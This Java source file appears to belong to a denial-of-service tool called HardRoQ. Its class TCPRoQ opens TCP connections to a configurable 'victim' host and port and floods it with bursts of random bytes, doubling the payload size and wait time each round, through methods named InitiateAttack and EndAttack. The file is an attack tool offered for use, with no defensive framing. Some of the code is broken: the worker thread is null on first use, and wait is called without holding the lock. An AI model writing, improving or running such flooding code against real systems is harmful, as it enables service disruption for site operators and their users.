package hardroq.networking;

import java.io.OutputStream;
import java.net.Socket;
import java.util.Random;

public class TCPRoQ {
	//Parameters
	private final String host;
	private final int port;
	private final int timeout;
	private final int datasize;
	private final int burstcount;
	
	//Internals
	private final Object simpleLock = new Object();
	private final Random random = new Random();
	private Thread workerThread;
	private Socket socket;
	private boolean attacking = false;
	
	private TCPRoQ (Builder builder) {
		host = builder.host;
		port = builder.port;
		timeout = builder.timeout;
		datasize = builder.datasize;
		burstcount = builder.burstcount;
	}
	
	public void InitiateAttack() {
		attacking = true;
		if (!workerThread.isAlive()) {
			workerThread = new Thread(work);
			workerThread.start();
		}
	}
	
	public void EndAttack() {
		attacking = false;
		workerThread.interrupt();
	}
	
	private Runnable work = new Runnable() {
		@Override
		public void run() {
			try {
				while (attacking) {
				//Establish a connection to our victim
					socket = new Socket(host, port);
				
					/*
					  Connection established, now the idea is to repeatedly send a burst of data
					  after each burst, we will wait for a given amount of time
					  then after we wait, we will repeat, only we will double the datasize and
					  the timeout value until the victim disconnects us.
					*/
					int c = 1;
	
					OutputStream out = socket.getOutputStream();
					while (socket.isConnected() && attacking) {
						//create our payload buffer
						final byte[] payload = new byte[datasize * c];
						for (int i = burstcount; --i > 0;) {
							//generate our crap data
							random.nextBytes(payload);
							
							//send the data
							out.write(payload);
							out.flush();
						}
						
						//wait and increment c
						simpleLock.wait(timeout * 1000 * c++);
					}
				}
			} catch (Exception ex) {
				//gulp for now
			}
		}
	};
	
	public static class Builder {
		public Builder() {}
		private String host = "127.0.0.1";
		private int port = 80;
		private int timeout = 1;
		private int datasize = 16 * 1024;
		private int burstcount = 100;
		
		public Builder host(String h) {
			host = h;
			return this;
		}
		
		public Builder port (int p) {
			port = p;
			return this;
		}
		
		public Builder timeout (int t) {
			timeout = t;
			return this;
		}
		
		public Builder datasize (int d) {
			datasize = d;
			return this;
		}
		
		public Builder burstcount (int b) {
			burstcount = b;
			return this;
		}
		
		public TCPRoQ build() {
			return new TCPRoQ(this);
		}
	}
}
